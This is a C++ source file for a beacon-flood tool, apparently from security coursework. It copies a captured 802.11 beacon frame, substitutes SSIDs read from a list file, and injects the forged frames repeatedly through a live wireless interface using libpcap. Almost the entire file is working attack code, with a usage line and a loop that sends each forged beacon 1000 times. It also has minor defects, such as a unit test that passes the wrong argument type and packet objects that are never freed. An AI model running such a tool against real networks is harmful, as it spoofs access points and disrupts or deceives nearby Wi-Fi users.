#include "pch.h"
#include <gtest/gtest.h>
#include <time.h>
#include <cstring>
#include <unistd.h>
#include <fstream>
#include <vector>

std::vector<std::string> readFile(const std::string& filename) {
    std::ifstream file(filename);
    std::vector<std::string> lines;
    std::string line;

    while (std::getline(file, line)) {
        lines.push_back(line);
    }

    return lines;
}

void beaconFlood(std::string interface_name, std::vector<std::string>& ssid_list){
    char errbuf[PCAP_ERRBUF_SIZE] = {0, };
    std::string source_packet_name("80211packet_iptimeN150UA2.pcapng");

    pcap_t* pcap_descripter = nullptr;
    pcap_t* send_pcap_descripter = nullptr;
    pcap_descripter = pcap_open_offline(source_packet_name.c_str(), errbuf);
    
    send_pcap_descripter = pcap_open_live(interface_name.c_str(), BUFSIZ, 0, 0, errbuf);
    if(!pcap_descripter || !send_pcap_descripter){
        puts("pcap_open_live Error");
        HANDLE_ERROR_RETURN("beaconFlood", errbuf);
    }

    struct Packet{
        size_t _size;
        unsigned char * _start;
        Packet(){
            #ifdef DEBUG
            std::cout<<"객체생성"<<std::endl;
            #endif
        };
        unsigned char * getAddress(int index){
            return _start + index;
        }
        ~Packet(){
            #ifdef DEBUG
            std::cout<<"소멸자생성"<<std::endl;
            #endif
            free(_start);
        }
        
    };

    const unsigned char* packet;
    struct pcap_pkthdr* packet_info;
    int res;
    int ssid_len;
    std::string caputre_ssid = "SSU328";
    if(res = pcap_next_ex(pcap_descripter, &packet_info, &packet) < 0){
        puts("잘못된 80211packet_iptimeN150UA2.pcapng파일입니다.\n");
        exit(1);
    }
    
    std::vector<struct Packet *> modified_packets;
    for(std::string &inputed_name : ssid_list){
        #ifdef DEBUG
        std::cout<<inputed_name<<std::endl;
        #endif
        uint16_t radiotap_header_len = (uint16_t) *(packet+2);
        int ssid_len_index = radiotap_header_len + 24 + 12 + 1;
        int timestap_len_index = radiotap_header_len + 24 - 2;
        ssid_len = *(unsigned char *)(packet + ssid_len_index);
        struct Packet* des = new struct Packet();
        des->_size = (sizeof(char)*packet_info->caplen) + (inputed_name.length() - ssid_len);
        des->_start = (unsigned char *)malloc(des->_size);
        memcpy((unsigned char *)des->_start, (unsigned char *)packet, radiotap_header_len + 24 + 12 + 1);
        for(int i = 3; i<radiotap_header_len; i++)
            des->_start[i] = 0x00;
        *(des->getAddress(ssid_len_index)) = inputed_name.length();
        memcpy(des->getAddress(ssid_len_index+1), inputed_name.c_str(), inputed_name.size());
        memcpy(des->getAddress(ssid_len_index+1+inputed_name.size()), packet+ssid_len_index+1+ssid_len, packet_info->caplen - (ssid_len_index + 1 + ssid_len));
        modified_packets.push_back(des);
    }

    std::cout<<modified_packets.size()<<std::endl;
    std::cout<<"Beacon Flooding..."<<std::endl;
    for(int i = 0; i<1000; i++){
        for(struct Packet *modified_packet : modified_packets){
            if(pcap_sendpacket(send_pcap_descripter, modified_packet->_start, modified_packet->_size) == -1){
                HANDLE_ERROR_RETURN("beaconflood", errbuf);
            }
            #ifdef DEBUG
            std::cout<<i<<"패킷을 보냅니다"<<std::endl;
            #endif
            usleep((int)(500000/modified_packets.size()));
        }
    }
    std::cout<<"Beacon Flooding Success!"<<std::endl;
    modified_packets.clear();
    pcap_close(pcap_descripter);
}

int main(int argc, char* argv[]){
    if(argc != 3){
        printf("Usage: beacon-flood <interface> <ssid-list-file>");
        exit(1);
    }
    std::string interface_name(argv[1]);
    std::string ssid_list_file_name(argv[2]);
    std::vector<std::string> ssid_list = readFile(ssid_list_file_name);
    beaconFlood(interface_name, ssid_list);
    return 0;
}

#ifdef UNIT_TEST
TEST(BeaconFloodTest, HandlesValidInput) {
    beaconFlood(std::string("wlan0"), std::string("80211packet_iptimeN150UA2.pcapng"));
}

int main(int argc, char **argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
#endif